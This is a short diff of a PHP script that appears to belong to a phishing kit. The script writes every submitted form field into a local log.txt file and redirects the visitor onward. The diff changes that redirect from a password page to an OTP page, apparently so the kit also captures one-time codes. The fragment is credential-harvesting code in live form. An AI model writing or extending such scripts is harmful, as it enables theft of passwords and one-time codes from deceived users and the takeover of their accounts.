@@ -1,5 +1,5 @@
 <?php
-header ('Location: password.html');
+header ('Location: otp.html');
 $handle = fopen("log.txt", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
